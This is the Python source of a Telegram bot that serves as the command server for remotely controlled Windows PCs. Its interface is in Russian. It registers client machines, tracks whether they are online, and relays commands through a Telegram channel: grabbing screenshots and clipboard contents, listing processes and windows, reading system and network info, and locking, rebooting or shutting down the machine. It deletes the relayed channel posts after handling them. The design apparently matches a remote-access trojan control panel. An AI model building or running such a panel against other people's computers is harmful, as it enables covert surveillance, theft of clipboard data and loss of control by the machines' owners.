import asyncio
import os
import base64
import sqlite3
import time
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, BufferedInputFile
from dotenv import load_dotenv

load_dotenv()
TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = 5153650495
CHANNEL_USERNAME = "hurghgruuruhgrughuhgur47846776v7" 

bot = Bot(token=TOKEN)
dp = Dispatcher()

screenshot_buffers = {}

# --- БАЗА ДАННЫХ ---
DB_PATH = os.path.join(os.path.dirname(__file__), "devices.db")

def init_db():
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS devices (
            device_id TEXT PRIMARY KEY,
            name TEXT,
            last_seen INTEGER,
            is_notified INTEGER DEFAULT 0
        )
    """)
    conn.commit()
    conn.close()

def update_device_in_db(device_id, name, is_notified=None):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    current_time = int(time.time())
    
    cursor.execute("SELECT is_notified FROM devices WHERE device_id = ?", (device_id,))
    row = cursor.fetchone()
    
    if row is None:
        notif = is_notified if is_notified is not None else 0
        cursor.execute("INSERT INTO devices (device_id, name, last_seen, is_notified) VALUES (?, ?, ?, ?)",
                       (device_id, name, current_time, notif))
    else:
        if is_notified is not None:
            cursor.execute("UPDATE devices SET name = ?, last_seen = ?, is_notified = ? WHERE device_id = ?",
                           (name, current_time, is_notified, device_id))
        else:
            cursor.execute("UPDATE devices SET name = ?, last_seen = ? WHERE device_id = ?",
                           (name, current_time, device_id))
        
    conn.commit()
    conn.close()

def get_all_devices():
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("SELECT device_id, name, last_seen FROM devices")
    rows = cursor.fetchall()
    conn.close()
    return rows

def get_device(device_id):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("SELECT name, last_seen, is_notified FROM devices WHERE device_id = ?", (device_id,))
    row = cursor.fetchone()
    conn.close()
    return row

def delete_device(device_id):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("DELETE FROM devices WHERE device_id = ?", (device_id,))
    conn.commit()
    conn.close()

# --- ИНТЕРФЕЙС ---
def get_main_menu():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📋 Список устройств", callback_data="back_to_list")],
        [InlineKeyboardButton(text="📊 Статистика системы", callback_data="global_stats")],
        [InlineKeyboardButton(text="🗑 Очистить оффлайн", callback_data="clean_offline")]
    ])

def get_device_menu(device_id: str):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📊 Инфо и Мониторинг", callback_data=f"cat_mon_{device_id}")],
        [InlineKeyboardButton(text="⚙️ Системные действия", callback_data=f"cat_sys_{device_id}")],
        [InlineKeyboardButton(text="🌐 Открытие ресурсов", callback_data=f"cat_web_{device_id}")],
        [InlineKeyboardButton(text="🛠 Утилиты и Приложения", callback_data=f"cat_util_{device_id}")],
        [InlineKeyboardButton(text="🔍 Дополнительно", callback_data=f"cat_extra_{device_id}")],
        [InlineKeyboardButton(text="⬅️ В главное меню", callback_data="go_to_main_start")]
    ])

def get_monitoring_menu(device_id):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📸 Скриншот", callback_data=f"cmd_screen_{device_id}")],
        [InlineKeyboardButton(text="📋 Процессы", callback_data=f"cmd_tasklist_{device_id}")],
        [InlineKeyboardButton(text="📱 Открытые окна", callback_data=f"cmd_apps_{device_id}")],
        [InlineKeyboardButton(text="🪟 Активное окно", callback_data=f"cmd_activewin_{device_id}")],
        [InlineKeyboardButton(text="📋 Буфер обмена", callback_data=f"cmd_clipboard_{device_id}")],
        [InlineKeyboardButton(text="⬅️ Назад", callback_data=f"manage_{device_id}")]
    ])

def get_system_menu(device_id):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔒 Блок экрана", callback_data=f"cmd_lock_{device_id}")],
        [InlineKeyboardButton(text="🌙 Сон", callback_data=f"cmd_sleep_{device_id}")],
        [InlineKeyboardButton(text="🔄 Перезагрузка", callback_data=f"cmd_reboot_{device_id}")],
        [InlineKeyboardButton(text="🛑 Выключение", callback_data=f"cmd_shutdown_{device_id}")],
        [InlineKeyboardButton(text="🔊 Звук макс.", callback_data=f"cmd_volmax_{device_id}")],
        [InlineKeyboardButton(text="🔇 Отключить звук", callback_data=f"cmd_mute_{device_id}")],
        [InlineKeyboardButton(text="🔊 Включить звук", callback_data=f"cmd_unmute_{device_id}")],
        [InlineKeyboardButton(text="💡 Яркость 50%", callback_data=f"cmd_brightness50_{device_id}")],
        [InlineKeyboardButton(text="💡 Яркость 100%", callback_data=f"cmd_brightness100_{device_id}")],
        [InlineKeyboardButton(text="⬅️ Назад", callback_data=f"manage_{device_id}")]
    ])

def get_web_menu(device_id):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🌐 YouTube", callback_data=f"cmd_yt_{device_id}")],
        [InlineKeyboardButton(text="🔍 Google", callback_data=f"cmd_google_{device_id}")],
        [InlineKeyboardButton(text="🗺 Карты", callback_data=f"cmd_maps_{device_id}")],
        [InlineKeyboardButton(text="💬 Сообщение", callback_data=f"cmd_msg_{device_id}")],
        [InlineKeyboardButton(text="⬅️ Назад", callback_data=f"manage_{device_id}")]
    ])

def get_util_menu(device_id):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🧮 Калькулятор", callback_data=f"cmd_calc_{device_id}")],
        [InlineKeyboardButton(text="📝 Блокнот", callback_data=f"cmd_notepad_{device_id}")],
        [InlineKeyboardButton(text="🎨 Paint", callback_data=f"cmd_paint_{device_id}")],
        [InlineKeyboardButton(text="⏳ Скринывер", callback_data=f"cmd_scr_{device_id}")],
        [InlineKeyboardButton(text="⬅️ Назад", callback_data=f"manage_{device_id}")]
    ])

def get_extra_menu(device_id):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💻 Системная инфо", callback_data=f"cmd_sysinfo_{device_id}")],
        [InlineKeyboardButton(text="🌐 Сетевая инфо", callback_data=f"cmd_netinfo_{device_id}")],
        [InlineKeyboardButton(text="🔋 Батарея", callback_data=f"cmd_battery_{device_id}")],
        [InlineKeyboardButton(text="🔄 Точка восстановления", callback_data=f"cmd_restore_{device_id}")],
        [InlineKeyboardButton(text="🔓 Разблокировать приложения", callback_data=f"cmd_unblock_{device_id}")],
        [InlineKeyboardButton(text="🗑 Удалить устройство", callback_data=f"delete_{device_id}")],
        [InlineKeyboardButton(text="⬅️ Назад", callback_data=f"manage_{device_id}")]
    ])

# --- ОБРАБОТЧИКИ КОМАНД ---

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    if message.from_user.id != ADMIN_ID: return
    await message.answer("🤖 Панель управления Windows v2.0\nВсе данные сохранены в БД.", reply_markup=get_main_menu())

@dp.callback_query(F.data == "go_to_main_start")
async def go_to_main_start(callback: types.CallbackQuery):
    text = "🤖 **Главное меню**"
    markup = get_main_menu()
    
    if callback.message.photo or callback.message.document:
        await callback.message.edit_caption(caption=text, parse_mode="Markdown", reply_markup=markup)
    else:
        await callback.message.edit_text(text=text, parse_mode="Markdown", reply_markup=markup)

@dp.callback_query(F.data == "back_to_list")
async def show_devices_callback(callback: types.CallbackQuery):
    devices = get_all_devices()
    if not devices:
        await callback.message.edit_text("❌ Список устройств пуст.", reply_markup=get_main_menu())
        return
    
    keyboard = []
    current_time = int(time.time())
    
    for dev_id, name, last_seen in devices:
        status_emoji = "🟢" if current_time - last_seen < 180 else "🔴"
        keyboard.append([InlineKeyboardButton(text=f"{status_emoji} {name}", callback_data=f"manage_{dev_id}")])
    
    keyboard.append([InlineKeyboardButton(text="⬅️ Назад", callback_data="go_to_main_start")])
    
    await callback.message.edit_text("🎛 **Список устройств из Базы Данных:**", parse_mode="Markdown", 
                                   reply_markup=InlineKeyboardMarkup(inline_keyboard=keyboard))

@dp.callback_query(F.data == "global_stats")
async def global_stats(callback: types.CallbackQuery):
    devices = get_all_devices()
    total = len(devices)
    online = 0
    current_time = int(time.time())
    
    for dev_id, name, last_seen in devices:
        if current_time - last_seen < 180:
            online += 1
    
    text = f"📊 **Глобальная статистика:**\n"
    text += f"• Всего устройств: {total}\n"
    text += f"• Онлайн: {online}\n"
    text += f"• Оффлайн: {total - online}\n"
    text += f"• Активность: {int(online/total*100) if total > 0 else 0}%"
    
    await callback.message.edit_text(text, parse_mode="Markdown", reply_markup=get_main_menu())

@dp.callback_query(F.data == "clean_offline")
async def clean_offline(callback: types.CallbackQuery):
    devices = get_all_devices()
    current_time = int(time.time())
    deleted = 0
    
    for dev_id, name, last_seen in devices:
        if current_time - last_seen >= 180:
            delete_device(dev_id)
            deleted += 1
    
    await callback.answer(f"🗑 Удалено {deleted} оффлайн устройств")
    
    # Обновляем список
    devices = get_all_devices()
    if not devices:
        await callback.message.edit_text("✅ Все оффлайн устройства удалены.", reply_markup=get_main_menu())
        return
    
    keyboard = []
    for dev_id, name, last_seen in devices:
        status_emoji = "🟢" if current_time - last_seen < 180 else "🔴"
        keyboard.append([InlineKeyboardButton(text=f"{status_emoji} {name}", callback_data=f"manage_{dev_id}")])
    
    await callback.message.edit_text("🎛 **Обновленный список устройств:**", parse_mode="Markdown", 
                                   reply_markup=InlineKeyboardMarkup(inline_keyboard=keyboard))

@dp.callback_query(F.data.startswith("manage_"))
async def manage_device(callback: types.CallbackQuery):
    device_id = callback.data.split("_")[1]
    device_info = get_device(device_id)
    if not device_info: 
        await callback.answer("❌ Устройство удалено или не найдено.")
        return
    
    current_time = int(time.time())
    status_str = "🟢 Онлайн" if current_time - device_info[1] < 180 else "🔴 Оффлайн"
    
    text = f"💻 Управление ПК: *{device_info[0]}*\nСтатус: {status_str}\n🆔 ID: `{device_id}`"
    markup = get_device_menu(device_id)
    
    if callback.message.photo or callback.message.document:
        await callback.message.edit_caption(caption=text, parse_mode="Markdown", reply_markup=markup)
    else:
        await callback.message.edit_text(text=text, parse_mode="Markdown", reply_markup=markup)

@dp.callback_query(F.data.startswith("delete_"))
async def delete_device_callback(callback: types.CallbackQuery):
    device_id = callback.data.split("_")[1]
    device_info = get_device(device_id)
    if device_info:
        delete_device(device_id)
        await callback.answer(f"✅ Устройство {device_info[0]} удалено")
    else:
        await callback.answer("❌ Устройство не найдено")
    
    # Возвращаемся к списку
    await show_devices_callback(callback)

@dp.callback_query(F.data.startswith("cat_"))
async def handle_categories(callback: types.CallbackQuery):
    data = callback.data.split("_")
    cat, dev_id = data[1], data[2]
    
    text = ""
    markup = None
    
    if cat == "mon":
        text = "📊 **Мониторинг**"
        markup = get_monitoring_menu(dev_id)
    elif cat == "sys":
        text = "⚙️ **Системные действия**"
        markup = get_system_menu(dev_id)
    elif cat == "web":
        text = "🌐 **Ресурсы**"
        markup = get_web_menu(dev_id)
    elif cat == "util":
        text = "🛠 **Утилиты**"
        markup = get_util_menu(dev_id)
    elif cat == "extra":
        text = "🔍 **Дополнительные функции**"
        markup = get_extra_menu(dev_id)
    else:
        return

    if callback.message.photo or callback.message.document:
        await callback.message.edit_caption(caption=text, parse_mode="Markdown", reply_markup=markup)
    else:
        await callback.message.edit_text(text=text, parse_mode="Markdown", reply_markup=markup)

@dp.callback_query(F.data.startswith("cmd_"))
async def send_command(callback: types.CallbackQuery):
    parts = callback.data.split("_")
    if len(parts) < 3:
        await callback.answer("❌ Ошибка в команде")
        return
    
    cmd_type = parts[1]
    device_id = parts[2]
    
    # Обработка команд с параметрами
    if cmd_type == "brightness50":
        full_cmd = "brightness:50"
    elif cmd_type == "brightness100":
        full_cmd = "brightness:100"
    elif cmd_type == "mute":
        full_cmd = "mute"
    elif cmd_type == "unmute":
        full_cmd = "unmute"
    elif cmd_type == "apps":
        full_cmd = "apps"
    elif cmd_type == "activewin":
        full_cmd = "activewin"
    elif cmd_type == "clipboard":
        full_cmd = "clipboard"
    elif cmd_type == "sysinfo":
        full_cmd = "sysinfo"
    elif cmd_type == "netinfo":
        full_cmd = "netinfo"
    elif cmd_type == "battery":
        full_cmd = "battery"
    elif cmd_type == "restore":
        full_cmd = "restore"
    elif cmd_type == "unblock":
        full_cmd = "unblock"
    else:
        full_cmd = cmd_type
    
    try:
        await bot.send_message(chat_id=f"@{CHANNEL_USERNAME}", text=f"CMD:{device_id}:{full_cmd}")
        await callback.answer("🚀 Команда отправлена!")
    except Exception as e:
        await callback.answer(f"❌ Ошибка отправки: {str(e)[:50]}")

# --- ПРИЕМ ДАННЫХ ИЗ КАНАЛА ---

@dp.channel_post(F.text.startswith("INIT_START:"))
async def handle_client_startup(message: types.Message):
    try:
        _, device_id, pc_name = message.text.split(":")
        update_device_in_db(device_id, pc_name, is_notified=0)
        await bot.send_message(
            chat_id=ADMIN_ID, 
            text=f"⚡️ **Клиент запущен на ПК!**\n💻 Имя: `{pc_name}`\n🟢 Устройство сейчас активно.", 
            parse_mode="Markdown",
            reply_markup=get_device_menu(device_id)
        )
        await message.delete()
    except: pass

@dp.channel_post(F.text.startswith("PING:"))
async def handle_channel_ping(message: types.Message):
    try:
        _, device_id, pc_name = message.text.split(":")
        
        dev = get_device(device_id)
        current_time = int(time.time())
        
        if not dev:
            update_device_in_db(device_id, pc_name, is_notified=1)
            await bot.send_message(chat_id=ADMIN_ID, text=f"🆕 **Зарегистрирован новый ПК:** `{pc_name}`", parse_mode="Markdown", reply_markup=get_device_menu(device_id))
        else:
            last_seen, is_notified = dev[1], dev[2]
            if current_time - last_seen >= 180 or is_notified == 0:
                update_device_in_db(device_id, pc_name, is_notified=1)
                await bot.send_message(chat_id=ADMIN_ID, text=f"🟢 **ПК `{pc_name}` снова на связи!**", parse_mode="Markdown", reply_markup=get_device_menu(device_id))
            else:
                update_device_in_db(device_id, pc_name)
                
        await message.delete()
    except: pass

@dp.channel_post(F.text.startswith("SCR_PART:"))
async def receive_screenshot_part(message: types.Message):
    try:
        _, device_id, part_num, total_parts, base64_chunk = message.text.split(":", 4)
        part_num = int(part_num)
        total_parts = int(total_parts)
        
        if device_id not in screenshot_buffers:
            screenshot_buffers[device_id] = {}
            
        screenshot_buffers[device_id][part_num] = base64_chunk
        await message.delete()
        
        if len(screenshot_buffers[device_id]) == total_parts:
            device_info = get_device(device_id)
            pc_name = device_info[0] if device_info else "ПК"
            
            full_base64 = "".join([screenshot_buffers[device_id][i] for i in range(total_parts)])
            del screenshot_buffers[device_id]
            
            image_bytes = base64.b64decode(full_base64)
            await bot.send_photo(
                chat_id=ADMIN_ID,
                photo=BufferedInputFile(image_bytes, filename="screenshot.jpg"),
                caption=f"📸 Скриншот с ПК: *{pc_name}*",
                parse_mode="Markdown",
                reply_markup=get_device_menu(device_id)
            )
    except Exception as e:
        # Логируем ошибку
        print(f"Error processing screenshot: {e}")

@dp.channel_post(F.text.startswith("LOG_REPLY:"))
async def receive_channel_log(message: types.Message):
    try:
        text_data = message.text.replace("LOG_REPLY:", "")
        
        # Пытаемся найти устройство по имени в тексте
        device_id = None
        for dev_id, name, _ in get_all_devices():
            if name in text_data:
                device_id = dev_id
                break
        
        markup = get_device_menu(device_id) if device_id else None
        
        # Если сообщение содержит изображение, отправляем как фото
        if "скриншот" in text_data.lower() or "screenshot" in text_data.lower():
            # Ищем в тексте base64
            if "base64:" in text_data:
                try:
                    parts = text_data.split("base64:")
                    img_data = parts[1].strip()
                    image_bytes = base64.b64decode(img_data)
                    await bot.send_photo(
                        chat_id=ADMIN_ID,
                        photo=BufferedInputFile(image_bytes, filename="image.jpg"),
                        caption=text_data[:200],
                        parse_mode="Markdown",
                        reply_markup=markup
                    )
                    await message.delete()
                    return
                except:
                    pass
        
        # Если это системная информация, отправляем с улучшенным форматированием
        if any(key in text_data for key in ["Информация о системе", "Сетевая информация", "Батарея"]):
            await bot.send_message(chat_id=ADMIN_ID, text=text_data, parse_mode="Markdown", reply_markup=markup)
        else:
            # Обычное сообщение
            if len(text_data) > 4000:
                # Разбиваем длинные сообщения
                for i in range(0, len(text_data), 4000):
                    chunk = text_data[i:i+4000]
                    await bot.send_message(chat_id=ADMIN_ID, text=chunk, parse_mode="Markdown", reply_markup=markup if i == 0 else None)
            else:
                await bot.send_message(chat_id=ADMIN_ID, text=text_data, parse_mode="Markdown", reply_markup=markup)
        
        await message.delete()
    except Exception as e:
        print(f"Error processing log: {e}")

# --- ОБРАБОТКА ФАЙЛОВ ДЛЯ УСТАНОВКИ ОБОЕВ ---

@dp.message(F.photo)
async def handle_photo_for_wallpaper(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return
    
    # Проверяем, есть ли команда для установки обоев
    if message.caption and "wallpaper" in message.caption.lower():
        try:
            # Получаем самое большое фото
            photo = message.photo[-1]
            file = await bot.get_file(photo.file_id)
            file_data = await bot.download_file(file.file_path)
            
            # Отправляем команду клиенту
            await bot.send_message(
                chat_id=f"@{CHANNEL_USERNAME}",
                text=f"WALLPAPER_SET:{file_data.getvalue()}"
            )
            await message.reply("🖼 Изображение отправлено для установки обоев")
        except Exception as e:
            await message.reply(f"❌ Ошибка: {str(e)}")

# --- УТИЛИТЫ ---

async def send_message_to_device(device_id, text):
    """Отправляет произвольное сообщение устройству"""
    try:
        await bot.send_message(chat_id=f"@{CHANNEL_USERNAME}", text=f"CMD:{device_id}:{text}")
        return True
    except:
        return False

# --- ЗАПУСК ---

async def main():
    init_db()
    print("[СЕРВЕР] База данных подключена. Ожидание сигналов...")
    print(f"[СЕРВЕР] Бот запущен, ID админа: {ADMIN_ID}")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
